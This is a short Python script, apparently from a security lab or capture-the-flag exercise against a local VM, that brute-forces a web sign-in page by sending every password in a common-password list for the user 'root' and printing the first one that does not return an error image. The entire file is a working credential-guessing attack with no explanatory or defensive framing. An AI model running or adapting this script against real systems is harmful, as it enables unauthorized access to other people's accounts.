import requests

VM_IP = '10.13.0.216'

if __name__ == "__main__":
    password_list = open('common_passwords.txt', 'r')
    for line in password_list.readlines():
        response = requests.get(
            'http://' +
            VM_IP +
            '/index.php?page=signin&username=root&password=' +
            line.replace('\n', '') + '&Login=Login'
        )
        if 'WrongAnswer.gif' not in str(response.content):
            print(line)
            break
